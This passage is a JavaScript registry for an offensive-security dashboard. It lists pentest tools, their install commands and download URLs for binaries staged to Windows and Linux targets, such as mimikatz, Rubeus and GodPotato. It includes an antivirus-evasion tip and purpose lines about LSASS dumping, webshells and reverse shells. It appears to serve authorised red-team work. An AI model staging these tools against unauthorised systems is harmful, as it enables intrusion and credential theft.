/*!
 * obol data — tools-install.js — OBOL.ARSENAL
 * The install/stage registry for the Loadout tab and the generated download-arsenal.sh.
 *
 * This is a faithful port of obol-local's provisioner slate (obol/provision.py): the same
 * curated upstream sources, versions, licenses, and detection binaries. obol-local only
 * *fetches* the tools Kali does NOT ship (the compiled binaries / scripts below); it assumes
 * the apt tooling is already present. We mirror that split exactly:
 *   - `kali`   — ships with a standard Kali install; nothing to fetch (just a ✓ badge).
 *   - `apt`/`pipx`/`git`/`go` — a one-line install for a tool Kali does not ship by default.
 *   - `stage-win`/`stage-lin`/`material` — a binary/script fetched to the attack box and (for
 *     the Windows ones) staged into the workspace www/ dir to serve to a target.
 *
 * Integrity model (also mirrored, enforced by the generated script, not here): fetch upstream
 * `latest` by default; honor an optional pinned `version` + `sha256`; never fabricate a digest.
 *
 * Keyed by the TOOL-NAME string that moves use in `tool`/`tools` and builders use in `equips[]`,
 * so one lookup joins moves ↔ command builders ↔ install recipe ↔ the pasted-back inventory.
 * `variants` lists every invocation a box might expose for command-rewrite (Loadout Phase 3).
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};
  var A = {};

  // ── 1. Kali-default tools — present in a standard Kali install; no fetch. [name, category, os]
  var KALI = [
    ['nmap', 'Recon', 'linux'], ['masscan', 'Recon', 'linux'], ['rustscan', 'Recon', 'linux'],
    ['dig', 'Recon', 'linux'], ['nslookup', 'Recon', 'linux'], ['dnsenum', 'Recon', 'linux'],
    ['dnsrecon', 'Recon', 'linux'], ['onesixtyone', 'Recon', 'linux'], ['snmpwalk', 'Recon', 'linux'],
    ['snmp-check', 'Recon', 'linux'], ['smtp-user-enum', 'Recon', 'linux'], ['swaks', 'Recon', 'linux'],
    ['ike-scan', 'Recon', 'linux'], ['finger', 'Recon', 'linux'], ['ftp', 'Recon', 'linux'],
    ['onesixtyone', 'Recon', 'linux'], ['ldapsearch', 'AD', 'linux'], ['windapsearch', 'AD', 'linux'],
    ['kerbrute', 'AD', 'linux'], ['smbclient', 'AD', 'linux'], ['smbmap', 'AD', 'linux'],
    ['rpcclient', 'AD', 'linux'], ['enum4linux', 'AD', 'linux'], ['enum4linux-ng', 'AD', 'linux'],
    ['nxc', 'AD', 'linux'], ['nltest', 'AD', 'windows'], ['kinit', 'AD', 'linux'], ['klist', 'AD', 'multi'],
    ['responder', 'MITM', 'linux'], ['ntlmrelayx', 'MITM', 'linux'], ['mitm6', 'MITM', 'linux'],
    ['hashcat', 'Cracking', 'multi'], ['john', 'Cracking', 'linux'], ['hashid', 'Cracking', 'linux'],
    ['name-that-hash', 'Cracking', 'linux'], ['gpp-decrypt', 'Cracking', 'linux'], ['psk-crack', 'Cracking', 'linux'],
    ['7z2john', 'Cracking', 'linux'], ['rar2john', 'Cracking', 'linux'], ['zip2john', 'Cracking', 'linux'],
    ['hydra', 'Credentials', 'linux'], ['ffuf', 'Web', 'linux'], ['feroxbuster', 'Web', 'linux'],
    ['gobuster', 'Web', 'linux'], ['wfuzz', 'Web', 'linux'], ['nikto', 'Web', 'linux'],
    ['wpscan', 'Web', 'linux'], ['whatweb', 'Web', 'linux'], ['sqlmap', 'Web', 'linux'],
    ['arjun', 'Web', 'linux'], ['wget', 'Support', 'linux'], ['curl', 'Support', 'linux'],
    ['nc', 'Support', 'linux'], ['ncat', 'Support', 'linux'], ['openssl', 'Support', 'linux'],
    ['ssh', 'Lateral', 'linux'], ['sshpass', 'Lateral', 'linux'], ['xfreerdp', 'Lateral', 'linux'],
    ['vncviewer', 'Lateral', 'linux'], ['evil-winrm', 'Lateral', 'linux'], ['proxychains', 'Tunnel', 'linux'],
    ['proxychains4', 'Tunnel', 'linux'], ['sshuttle', 'Tunnel', 'linux'], ['mount', 'Support', 'linux'],
    ['showmount', 'Support', 'linux'], ['mysql', 'Database', 'linux'], ['mariadb', 'Database', 'linux'],
    ['psql', 'Database', 'linux'], ['redis-cli', 'Database', 'linux'], ['mssqlclient.py', 'Database', 'linux'],
    ['impacket-mssqlclient', 'Database', 'linux'], ['bloodhound', 'AD', 'linux'],
    ['bloodhound-python', 'AD', 'linux'], ['sprayhound', 'AD', 'linux'], ['metasploit', 'Exploitation', 'linux'],
    ['msfvenom', 'Exploitation', 'linux'], ['ysoserial', 'Web', 'linux'], ['git-dumper', 'Web', 'linux'],
    ['python3', 'Support', 'multi'], ['java', 'Support', 'multi'],
    ['svn', 'Support', 'linux'], ['penelope', 'Support', 'linux'], ['rlwrap', 'Support', 'linux'],
  ];
  KALI.forEach(function (row) {
    A[row[0]] = { key: row[0], label: row[0], category: row[1], os: row[2], class: 'kali',
      on_kali: true, install: '', canonical: row[0], variants: [row[0]], source: '', license: '', purpose: '' };
  });

  // The whole impacket example suite ships on Kali as `impacket-<tool>`; pip installs expose `<tool>.py`.
  // Linux is case-sensitive and SIX impacket scripts are CamelCase (GetNPUsers.py → impacket-GetNPUsers),
  // so the probe must look for the real case or it reports core AD tools (Kerberoast/AS-REP/S4U) missing
  // on a box that actually ships them. IMP_CASE maps the lowercase key suffix to its true on-disk case.
  var IMP_CASE = { getnpusers: 'GetNPUsers', getuserspns: 'GetUserSPNs', getst: 'getST',
    gettgt: 'getTGT', raisechild: 'raiseChild', goldenpac: 'goldenPac' };
  // One entry per tool obol references, each with its invocation variants for command-rewrite + probe.
  [['psexec', 'Lateral'], ['wmiexec', 'Lateral'], ['dcomexec', 'Lateral'], ['secretsdump', 'Credentials'],
   ['getnpusers', 'AD'], ['getuserspns', 'AD'], ['getst', 'AD'], ['gettgt', 'AD'], ['ticketer', 'AD'],
   ['addcomputer', 'AD'], ['rbcd', 'AD'], ['dacledit', 'AD'], ['lookupsid', 'AD'], ['raisechild', 'AD'],
   ['goldenpac', 'AD'], ['smbserver', 'Support'], ['dpapi', 'Credentials']].forEach(function (row) {
    var t = row[0], k = 'impacket-' + t, real = IMP_CASE[t] || t;   // real = the Kali wrapper / script case
    A[k] = { key: k, label: k, category: row[1], os: 'linux', class: 'kali', on_kali: true, install: '',
      canonical: 'impacket-' + real,
      variants: ['impacket-' + real, real + '.py', 'impacket-' + t, t + '.py',
        'python3 /usr/share/doc/python3-impacket/examples/' + real + '.py'],
      source: 'fortra/impacket', license: 'Apache-2.0', purpose: 'impacket ' + real };
  });
  // ntlmrelayx also ships on Kali as `impacket-ntlmrelayx` (the bare name is never on PATH), so probe
  // for the wrapper or a fully-provisioned box reports obol's most-used relay tool as missing.
  if (A.ntlmrelayx) {
    A.ntlmrelayx.canonical = 'impacket-ntlmrelayx';
    A.ntlmrelayx.variants = ['impacket-ntlmrelayx', 'ntlmrelayx', 'ntlmrelayx.py',
      'python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py'];
    A.ntlmrelayx.source = 'fortra/impacket'; A.ntlmrelayx.license = 'Apache-2.0';
  }
  // nxc / NetExec: the same tool under several historical names.
  A.nxc.variants = ['nxc', 'netexec', 'crackmapexec', 'cme'];
  A.nxc.source = 'Pennyw0rth/NetExec'; A.nxc.license = 'BSD-2-Clause';
  ['netexec', 'crackmapexec', 'cme'].forEach(function (n) {
    A[n] = { key: n, label: n, category: 'AD', os: 'linux', class: 'kali', on_kali: true, install: '',
      canonical: 'nxc', variants: ['nxc', 'netexec', 'crackmapexec', 'cme'], source: 'Pennyw0rth/NetExec', license: 'BSD-2-Clause', purpose: 'swiss-army SMB/LDAP/WinRM/MSSQL' };
  });

  // ── Don't assume what Kali ships. A fresh default install does NOT carry these (verified against the
  // Kali package catalog, kali.org/tools, not a decked-out box), yet obol's packs use them — so give each a
  // real install recipe. The setup script already runs every installer have-guarded (present → skip,
  // missing → install), so wiring a recipe turns "silently assumed present" into "installed if absent".
  function reclass(key, patch) { if (A[key]) Object.assign(A[key], patch); }
  // apt packages Kali publishes (install-if-missing; present on a decked-out box, apt-fetched on a bare one)
  [['rustscan', 'rustscan'], ['mitm6', 'mitm6'], ['enum4linux-ng', 'enum4linux-ng'], ['arjun', 'arjun'],
   ['name-that-hash', 'name-that-hash'], ['sprayhound', 'sprayhound'], ['penelope', 'penelope'],
   ['sshpass', 'sshpass'], ['sshuttle', 'sshuttle'], ['ncat', 'ncat'], ['rlwrap', 'rlwrap'],
   ['kinit', 'krb5-user'], ['klist', 'krb5-user']].forEach(function (r) {
    reclass(r[0], { class: 'apt', on_kali: false, install: 'sudo apt install -y ' + r[1], bins: [r[0]], source: 'kali/' + r[1] });
  });
  reclass('name-that-hash', { bins: ['name-that-hash', 'nth'], variants: ['name-that-hash', 'nth'] });
  reclass('penelope', { purpose: 'shell handler — auto PTY upgrade, session management, logging + file transfer (catch your reverse shells here)' });
  // pipx (no Kali package)
  reclass('git-dumper', { class: 'pipx', on_kali: false, install: 'pipx install git-dumper', bins: ['git-dumper'], source: 'arthaud/git-dumper', license: 'MIT' });
  // git run-from-repo (python; no Kali package) — cloned to ~/tools, invoked as windapsearch.py
  reclass('windapsearch', { class: 'git', on_kali: false, install: 'git clone https://github.com/ropnop/windapsearch ~/tools/windapsearch',
    bins: ['windapsearch.py'], canonical: 'windapsearch.py', variants: ['windapsearch.py', 'windapsearch'], source: 'ropnop/windapsearch', license: 'MIT' });
  // release binary → ~/.local/bin (Go tool, no Kali package)
  reclass('kerbrute', { class: 'release-bin', on_kali: false, gh_repo: 'ropnop/kerbrute', gh_asset: 'kerbrute_linux_amd64$',
    bins: ['kerbrute'], canonical: 'kerbrute', dest: 'kerbrute', install: '', source: 'ropnop/kerbrute', license: 'Apache-2.0' });
  // nltest runs on the TARGET (a Windows domain command), never on your Kali box — class it builtin like the
  // other target-side commands (cmd/powershell/wmic/reg) so it isn't probed and doesn't drag "ready" to 154/155.
  reclass('nltest', { class: 'builtin' });
  // name-only fixes — genuinely present on a default Kali, obol just probed the wrong name
  reclass('metasploit', { canonical: 'msfconsole', variants: ['msfconsole', 'msfvenom'] });        // metasploit-framework ships msfconsole
  reclass('mssqlclient.py', { canonical: 'impacket-mssqlclient', variants: ['impacket-mssqlclient', 'mssqlclient.py'] });  // alias of the impacket wrapper
  // BloodHound GUI: obol does the analysis on-site and never invokes the GUI, but offer it if the box lacks
  // it. have-guarded, so it only installs (and pulls neo4j) when actually absent.
  reclass('bloodhound', { class: 'apt', on_kali: false, install: 'sudo apt install -y bloodhound', bins: ['bloodhound'], source: 'kali/bloodhound', purpose: 'BloodHound GUI (optional — obol analyses collection data on-site)' });
  // ysoserial: Java deserialization payload generator used by the web lane (java -jar ysoserial.jar).
  // One jar, Java already present — fetch + cache it like any other material.
  reclass('ysoserial', { class: 'material', on_kali: false, gh_repo: 'frohoff/ysoserial', gh_asset: 'ysoserial.*\\.jar$', dest: 'ysoserial.jar', bins: ['ysoserial.jar'], canonical: 'ysoserial', source: 'frohoff/ysoserial', license: 'MIT', purpose: 'Java deserialization payload generator (gadget chains)' });

  // ── 2. Not on Kali by default — a one-line install. (pipx/git/go: the AD tools Kali omits.)
  var INSTALL = [
    { key: 'certipy', label: 'Certipy', category: 'AD', os: 'linux', class: 'pipx',
      install: 'pipx install certipy-ad', canonical: 'certipy', variants: ['certipy', 'certipy-ad'],
      source: 'ly4k/Certipy', license: 'MIT', purpose: 'AD CS enumeration + ESC abuse' },
    { key: 'bloodyad', label: 'bloodyAD', category: 'AD', os: 'linux', class: 'pipx',
      install: 'pipx install bloodyAD', canonical: 'bloodyad', variants: ['bloodyad', 'bloodyAD'],
      source: 'CravateRouge/bloodyAD', license: 'MIT', purpose: 'direct LDAP object/ACL manipulation' },
    { key: 'coercer', label: 'Coercer', category: 'AD', os: 'linux', class: 'pipx',
      install: 'pipx install coercer', canonical: 'coercer', variants: ['coercer', 'Coercer'],
      source: 'p0dalirius/Coercer', license: 'GPL-2.0', purpose: 'multi-method authentication coercion' },
    { key: 'pywhisker', label: 'pyWhisker', category: 'AD', os: 'linux', class: 'pipx',
      install: 'pipx install pywhisker', canonical: 'pywhisker', variants: ['pywhisker', 'pyWhisker'],
      source: 'ShutdownRepo/pywhisker', license: 'MIT', purpose: 'msDS-KeyCredentialLink (shadow credentials)' },
    { key: 'targetedkerberoast', label: 'targetedKerberoast', category: 'AD', os: 'linux', class: 'git',
      install: 'git clone https://github.com/ShutdownRepo/targetedKerberoast ~/tools/targetedKerberoast',
      canonical: 'targetedKerberoast.py', variants: ['targetedkerberoast', 'targetedKerberoast.py'],
      source: 'ShutdownRepo/targetedKerberoast', license: 'Apache-2.0', purpose: 'add-SPN → roast an ACL-controlled user' },
    { key: 'sccmhunter', label: 'SCCMHunter', category: 'AD', os: 'linux', class: 'git',
      install: 'git clone https://github.com/garrettfoster13/sccmhunter ~/tools/sccmhunter && pipx install ~/tools/sccmhunter',
      canonical: 'sccmhunter', variants: ['sccmhunter', 'sccmhunter.py'],
      source: 'garrettfoster13/sccmhunter', license: 'MIT', purpose: 'SCCM/MECM recon + takeover' },
    { key: 'pygpoabuse', label: 'pyGPOAbuse', category: 'AD', os: 'linux', class: 'git',
      install: 'git clone https://github.com/Hackndo/pyGPOAbuse ~/tools/pyGPOAbuse',
      canonical: 'pygpoabuse', variants: ['pygpoabuse', 'pygpoabuse.py'],
      source: 'Hackndo/pyGPOAbuse', license: 'MIT', purpose: 'GPO edit-rights → scheduled task' },
    { key: 'zerologon-scan', label: 'zerologon (tester)', category: 'AD', os: 'linux', class: 'git',
      install: 'git clone https://github.com/SecuraBV/CVE-2020-1472 ~/tools/zerologon',
      canonical: 'zerologon-scan', variants: ['zerologon-scan', 'zerologon_tester.py'],
      source: 'SecuraBV/CVE-2020-1472', license: 'MIT', purpose: 'safe Zerologon vulnerability check' },
  ];
  // the three coercion PoCs obol references by filename (run-from-repo python)
  [['petitpotam.py', 'topotam/PetitPotam', 'MS-EFSR coercion (PetitPotam)'],
   ['printerbug.py', 'dirkjanm/krbrelayx', 'MS-RPRN coercion (PrinterBug)'],
   ['dfscoerce.py', 'Wh04m1001/DFSCoerce', 'MS-DFSNM coercion (DFSCoerce)'],
   ['nopac.py', 'Ridter/noPac', 'noPac (CVE-2021-42278/42287)'],
   ['cve-2021-1675.py', 'cube0x0/CVE-2021-1675', 'PrintNightmare (CVE-2021-1675)']].forEach(function (r) {
    INSTALL.push({ key: r[0], label: r[0], category: 'AD', os: 'linux', class: 'git',
      install: 'git clone https://github.com/' + r[1] + ' ~/tools/' + r[1].split('/')[1],
      canonical: r[0], variants: [r[0]], source: r[1], license: 'see upstream', purpose: r[2] });
  });
  INSTALL.forEach(function (e) { e.on_kali = false; A[e.key] = e; });

  // ── 3. Staged materials / compiled binaries — ported from obol-local's provision.py REGISTRY.
  //    upstream `latest` unless a version is pinned; the .sh records sha256 (trust-on-first-use).
  var PEASS = 'https://github.com/peass-ng/PEASS-ng/releases/latest/download';
  var AV = 'offensive binary — expect Microsoft Defender to flag/quarantine it; obfuscate or load reflectively.';
  var MAT = [
    // Linux enum / privesc (fetched to Kali, served to a Linux target)
    { key: 'linpeas', label: 'linPEAS', category: 'Linux enum', os: 'linux', class: 'material',
      url: PEASS + '/linpeas.sh', dest: 'linpeas.sh', bins: ['linpeas.sh'], source: 'peass-ng/PEASS-ng', license: 'GPL-3.0', purpose: 'Linux privesc enumeration' },
    { key: 'linenum', label: 'LinEnum', category: 'Linux enum', os: 'linux', class: 'material',
      url: 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh', dest: 'LinEnum.sh', bins: ['LinEnum.sh'], source: 'rebootuser/LinEnum', license: 'GPL-3.0', purpose: 'Linux local enumeration' },
    { key: 'linux-exploit-suggester', label: 'linux-exploit-suggester', category: 'Linux enum', os: 'linux', class: 'material',
      url: 'https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh', dest: 'linux-exploit-suggester.sh', bins: ['linux-exploit-suggester.sh'], source: 'The-Z-Labs/linux-exploit-suggester', license: 'GPL-2.0', purpose: 'kernel/local exploit suggestion' },
    { key: 'pspy', label: 'pspy64', category: 'Linux enum', os: 'linux', class: 'material',
      url: 'https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64', dest: 'pspy64', bins: ['pspy64', 'pspy'], source: 'DominicBreuker/pspy', license: 'MIT', purpose: 'unprivileged process/cron snooping' },
    { key: 'socat', label: 'socat (static)', category: 'Tunnel', os: 'linux', class: 'material',
      url: 'https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat', dest: 'socat', bins: ['socat'], source: 'andrew-d/static-binaries', license: 'GPL-2.0', purpose: 'static relays / shell upgrade on the target' },
    // Windows enum / privesc / AD (fetched to Kali, staged into www/ to serve to a Windows target)
    { key: 'winpeas', label: 'winPEAS (x64)', category: 'Windows enum', os: 'windows', class: 'stage-win',
      url: PEASS + '/winPEASx64.exe', dest: 'winPEASx64.exe', bins: ['winPEASx64.exe'], source: 'peass-ng/PEASS-ng', license: 'GPL-3.0', purpose: 'Windows privesc enumeration', av_note: AV },
    { key: 'seatbelt', label: 'Seatbelt', category: 'Windows enum', os: 'windows', class: 'stage-win',
      url: 'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe', dest: 'Seatbelt.exe', bins: ['Seatbelt.exe'], source: 'GhostPack/Seatbelt', license: 'BSD-3-Clause', purpose: 'host security-posture enum (.NET)', av_note: AV },
    { key: 'powerview', label: 'PowerView', category: 'Windows enum', os: 'windows', class: 'stage-win',
      url: 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', dest: 'PowerView.ps1', bins: ['PowerView.ps1'], source: 'PowerShellMafia/PowerSploit', license: 'BSD-3-Clause', purpose: 'AD situational awareness (PowerShell)', av_note: AV },
    { key: 'procdump', label: 'ProcDump', category: 'Windows privesc', os: 'windows', class: 'stage-win',
      url: 'https://download.sysinternals.com/files/Procdump.zip', dest: 'procdump64.exe', bins: ['procdump64.exe', 'procdump.exe'], source: 'Sysinternals', license: 'Sysinternals EULA', purpose: 'LSASS minidump (signed MS binary)' },
    { key: 'godpotato', label: 'GodPotato', category: 'Windows privesc', os: 'windows', class: 'stage-win',
      url: 'https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe', dest: 'GodPotato-NET4.exe', bins: ['GodPotato-NET4.exe'], source: 'BeichenDream/GodPotato', license: 'MIT', purpose: 'SeImpersonate → SYSTEM (modern Windows)', av_note: AV },
    { key: 'winpeas-bat', label: 'winPEAS (.bat)', category: 'Windows enum', os: 'windows', class: 'stage-win',
      url: PEASS + '/winPEAS.bat', dest: 'winPEAS.bat', bins: ['winPEAS.bat'], source: 'peass-ng/PEASS-ng', license: 'GPL-3.0', purpose: 'winPEAS for constrained shells', av_note: AV },
    { key: 'rubeus', label: 'Rubeus', category: 'AD', os: 'windows', class: 'stage-win',
      url: 'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe', dest: 'Rubeus.exe', bins: ['Rubeus.exe'], source: 'GhostPack/Rubeus', license: 'BSD-3-Clause', purpose: 'Kerberos abuse from a foothold', av_note: AV },
    { key: 'mimikatz', label: 'mimikatz', category: 'Credentials', os: 'windows', class: 'stage-win',
      gh_repo: 'gentilkiwi/mimikatz', gh_asset: 'mimikatz_trunk\\.zip$', extract_member: 'x64/mimikatz\\.exe$', dest: 'mimikatz.exe', bins: ['mimikatz.exe'], source: 'gentilkiwi/mimikatz', license: 'CC-BY-4.0', purpose: 'credential dumping / Kerberos', av_note: AV },
    { key: 'pypykatz', label: 'pypykatz', category: 'Credentials', os: 'linux', class: 'pipx', on_kali: true,
      install: 'pipx install pypykatz', dest: '', bins: ['pypykatz'], source: 'skelsec/pypykatz', license: 'MIT', purpose: 'pure-python LSASS/registry secrets parser' },
    { key: 'sharphound', label: 'SharpHound', category: 'AD', os: 'windows', class: 'stage-win',
      gh_repo: 'BloodHoundAD/SharpHound', gh_asset: 'SharpHound.*\\.zip$', extract_member: 'SharpHound\\.exe$', dest: 'SharpHound.exe', bins: ['SharpHound.exe'], source: 'BloodHoundAD/SharpHound', license: 'GPL-3.0', purpose: 'BloodHound collection from a Windows foothold', av_note: AV },
    // SharpWSUS publishes NO GitHub releases (the release API 404s) — there is nothing to auto-fetch, so
    // flag it manual: the setup script skips it (no doomed download) and the Loadout card tells the operator
    // where to get it. Keeping the entry preserves the methodology/card for the WSUS lateral-movement lane.
    // nettitude/SharpWSUS publishes no GitHub release, but Flangvik/SharpCollection tracks a compiled build
    // (same precompiled-binary mirror pattern as the Ghostpack tools) — fetch from there so it stages like the rest.
    { key: 'sharpwsus', label: 'SharpWSUS', category: 'AD', os: 'windows', class: 'stage-win',
      url: 'https://raw.githubusercontent.com/Flangvik/SharpCollection/master/NetFramework_4.7_Any/SharpWSUS.exe', dest: 'SharpWSUS.exe', bins: ['SharpWSUS.exe'], source: 'nettitude/SharpWSUS (build: Flangvik/SharpCollection)', license: 'BSD-3-Clause', purpose: 'WSUS admin → lateral movement', av_note: AV },
    // SharpSCCM attaches the compiled .exe (and a merged build) directly to each release — not a .zip — so
    // match either; the fetch helper's default case moves a bare .exe straight to dest.
    { key: 'sharpsccm', label: 'SharpSCCM', category: 'AD', os: 'windows', class: 'stage-win',
      gh_repo: 'Mayyhem/SharpSCCM', gh_asset: 'SharpSCCM.*\\.(zip|exe)$', extract_member: 'SharpSCCM\\.exe$', dest: 'SharpSCCM.exe', bins: ['SharpSCCM.exe'], source: 'Mayyhem/SharpSCCM', license: 'BSD-3-Clause', purpose: 'SCCM client-push / policy creds', av_note: AV },
    { key: 'wesng', label: 'WES-NG', category: 'Windows privesc', os: 'linux', class: 'pipx',
      install: 'pipx install wesng', dest: '', bins: ['wes.py', 'wes'], source: 'bitsadmin/wesng', license: 'BSD-3-Clause', purpose: 'Windows missing-patch suggester (offline, from systeminfo)' },
    { key: 'nc.exe', label: 'nc64.exe', category: 'Tunnel', os: 'windows', class: 'stage-win',
      url: 'https://github.com/int0x33/nc.exe/raw/master/nc64.exe', dest: 'nc64.exe', bins: ['nc64.exe', 'nc.exe'], source: 'int0x33/nc.exe', license: 'GPL-2.0', purpose: 'Windows netcat for callbacks', av_note: AV },
    // Pivot binaries (multi — proxy on Kali, agent on the target)
    { key: 'chisel', label: 'chisel', category: 'Tunnel', os: 'multi', class: 'material',
      gh_repo: 'jpillora/chisel', gh_asset: 'chisel_.*_linux_amd64\\.gz$', dest: 'chisel', bins: ['chisel'], source: 'jpillora/chisel', license: 'MIT', purpose: 'reverse SOCKS / port-forward pivoting' },
    { key: 'ligolo-ng', label: 'ligolo-ng', category: 'Tunnel', os: 'multi', class: 'material',
      gh_repo: 'nicocha30/ligolo-ng', gh_asset: 'ligolo-ng_proxy_.*linux_amd64.*\\.tar\\.gz$', extract_member: '(^|/)proxy$', dest: 'ligolo-proxy', bins: ['proxy', 'ligolo-proxy', 'ligolo-ng'], source: 'nicocha30/ligolo-ng', license: 'GPL-3.0', purpose: 'route-backed pivoting (proxy on Kali, agent on target)' },
  ];
  MAT.forEach(function (e) {
    if (e.on_kali === undefined) e.on_kali = false;
    if (!e.canonical) e.canonical = (e.bins && e.bins[0]) || e.key;
    if (!e.variants) e.variants = (e.bins && e.bins.slice()) || [e.key];
    e.version = e.version || 'latest';
    e.sha256 = e.sha256 || '';
    A[e.key] = e;
  });

  // ligolo-agent / ligolo-proxy aliases some moves reference → fold onto ligolo-ng
  ['ligolo-agent', 'ligolo-proxy'].forEach(function (n) { if (!A[n]) A[n] = A['ligolo-ng']; });

  // ── 4. Shells + OS-native binaries — nothing to install/stage; present by definition.
  ['bash', 'sh', 'cmd', 'powershell', 'pwsh', 'stty', 'script', 'sudo', 'wmic', 'sc', 'reg',
   'icacls', 'accesschk', 'certutil', 'msiexec', 'lxc', 'pymongo'].forEach(function (n) {
    if (!A[n]) A[n] = { key: n, label: n, category: 'Built-in', os: 'multi', class: 'builtin',
      on_kali: true, install: '', canonical: n, variants: [n], source: '', license: '', purpose: 'shell / OS-native binary' };
  });

  // a few remaining referenced tools
  A.psexec = A.psexec || A['impacket-psexec'];                 // bare `psexec` → impacket
  // Debian dropped the standalone `ntpdate` package; the command now ships in `ntpsec-ntpdate`. Install-if-missing.
  A.ntpdate = A.ntpdate || { key: 'ntpdate', label: 'ntpdate', category: 'Support', os: 'linux', class: 'apt',
    on_kali: false, install: 'sudo apt install -y ntpsec-ntpdate', bins: ['ntpdate'], canonical: 'ntpdate', variants: ['ntpdate'], source: 'kali/ntpsec-ntpdate', license: '', purpose: 'clock sync before Kerberos (KRB_AP_ERR_SKEW)' };
  A['autoblue-ms17-010'] = A['autoblue-ms17-010'] || { key: 'autoblue-ms17-010', label: 'AutoBlue-MS17-010', category: 'Exploitation', os: 'linux', class: 'git', on_kali: false,
    install: 'git clone https://github.com/3ndG4me/AutoBlue-MS17-010 ~/tools/AutoBlue-MS17-010', canonical: 'autoblue-ms17-010', variants: ['autoblue-ms17-010'], source: '3ndG4me/AutoBlue-MS17-010', license: 'see upstream', purpose: 'EternalBlue (MS17-010) exploit chain' };
  // the Zerologon exploit restore helpers live in the same SecuraBV repo as the tester
  ['set_empty_pw.py', 'reinstall_original_pw.py'].forEach(function (n) { if (!A[n]) A[n] = A['zerologon-scan']; });

  // One-line "what it is / what it's for" blurbs for the Loadout hover cards — the base Kali tools ship with
  // no purpose text, so the catalog can't teach without them. Proper sentence capitalization; kept terse.
  var PURPOSE = {
    nmap: 'Port + service scanner — the backbone of every box\'s recon.',
    masscan: 'Mass-rate port scanner for sweeping large ranges fast.',
    rustscan: 'Fast port sweep that auto-feeds its results into Nmap.',
    dig: 'DNS lookups — records, zone transfers, reverse sweeps.',
    nslookup: 'Quick interactive DNS queries (A / MX / NS checks).',
    dnsenum: 'DNS enumeration — subdomains, zone transfers, brute.',
    dnsrecon: 'DNS recon — records, AXFR, and subdomain brute-forcing.',
    onesixtyone: 'Fast SNMP community-string scanner.',
    snmpwalk: 'Walk SNMP OIDs to pull config, users, and routes.',
    'snmp-check': 'Human-readable SNMP enumeration of a single host.',
    'smtp-user-enum': 'Enumerate valid users via SMTP VRFY / EXPN / RCPT.',
    swaks: 'Swiss-army SMTP client for testing and sending mail.',
    'ike-scan': 'Fingerprint and enumerate IKE / IPsec VPN endpoints.',
    finger: 'Query the legacy finger service for user info.',
    ftp: 'Interactive FTP client — anonymous access and file pulls.',
    ldapsearch: 'Raw LDAP queries against a domain controller.',
    windapsearch: 'Enumerate AD users, groups, and computers over LDAP.',
    kerbrute: 'Fast Kerberos user enumeration and password spraying.',
    smbclient: 'Interactive SMB client — list and grab file shares.',
    smbmap: 'Enumerate SMB shares and permissions across hosts.',
    rpcclient: 'MS-RPC client — users, groups, and policy over SMB.',
    enum4linux: 'Classic SMB / Samba enumeration wrapper.',
    'enum4linux-ng': 'Rewritten enum4linux with JSON / YAML output.',
    nxc: 'NetExec — swiss-army SMB / LDAP / WinRM / MSSQL abuse.',
    nltest: 'Windows domain-trust and DC discovery (runs on target).',
    kinit: 'Request a Kerberos TGT into your ccache (for PtT).',
    klist: 'List the Kerberos tickets cached in your ccache.',
    responder: 'Poison LLMNR / NBT-NS / mDNS to capture net-NTLM hashes.',
    ntlmrelayx: 'Relay captured NTLM auth to SMB / LDAP / HTTP targets.',
    mitm6: 'Spoof DHCPv6 / DNS to coerce Windows auth for relaying.',
    hashcat: 'GPU password cracker — the heavy hitter.',
    john: 'John the Ripper — CPU cracker and the *2john helpers.',
    hashid: 'Identify a hash type from its format.',
    'name-that-hash': 'Identify hash types (a modern hashid alternative).',
    'gpp-decrypt': 'Decrypt the fixed-key cpassword from GPP XML.',
    'psk-crack': 'Crack IKE aggressive-mode PSK hashes.',
    '7z2john': 'Extract a crackable hash from a 7-Zip archive.',
    rar2john: 'Extract a crackable hash from a RAR archive.',
    zip2john: 'Extract a crackable hash from a ZIP archive.',
    hydra: 'Online brute-force across dozens of login protocols.',
    ffuf: 'Fast web fuzzer — directories, vhosts, parameters.',
    feroxbuster: 'Recursive web content / directory discovery.',
    gobuster: 'Directory, DNS, and vhost brute-forcing.',
    wfuzz: 'Web fuzzer for parameters, dirs, and injection points.',
    nikto: 'Web-server vulnerability and misconfiguration scanner.',
    wpscan: 'WordPress enumeration and vulnerability scanner.',
    whatweb: 'Fingerprint web tech stacks and CMS versions.',
    sqlmap: 'Automated SQL-injection detection and exploitation.',
    arjun: 'Discover hidden HTTP parameters on an endpoint.',
    wget: 'Fetch files and pages over HTTP(S) / FTP.',
    curl: 'Scriptable HTTP(S) client — the web multitool.',
    nc: 'Netcat — raw TCP / UDP connections and listeners.',
    ncat: 'Nmap\'s netcat — adds TLS, proxies, better listeners.',
    openssl: 'TLS toolkit — connect, inspect certs, generate keys.',
    mount: 'Mount remote / local filesystems (NFS, SMB, etc.).',
    showmount: 'List the NFS exports a host offers.',
    python3: 'Scripting plus a quick HTTP server for file transfer.',
    java: 'Runtime for .jar tooling (ysoserial, BloodHound CE).',
    svn: 'Subversion client — dump source from exposed repos.',
    rlwrap: 'Add readline (history, arrows) to a raw shell.',
    ssh: 'Secure shell client — access, tunnels, port-forwards.',
    sshpass: 'Supply an SSH password non-interactively in scripts.',
    xfreerdp: 'RDP client — pass creds or hashes to Windows.',
    vncviewer: 'VNC client for exposed or weak VNC services.',
    'evil-winrm': 'The go-to WinRM shell (creds, hashes, scripts).',
    proxychains: 'Force a tool through a SOCKS / HTTP proxy chain.',
    proxychains4: 'Proxychains-ng — pivot tools over a SOCKS proxy.',
    sshuttle: 'VPN-like pivot tunnelled over a plain SSH session.',
    mysql: 'MySQL client — query and abuse exposed databases.',
    mariadb: 'MariaDB client (MySQL-compatible).',
    psql: 'PostgreSQL client — query and command-exec paths.',
    'redis-cli': 'Redis client — read keys, write webshells or SSH keys.',
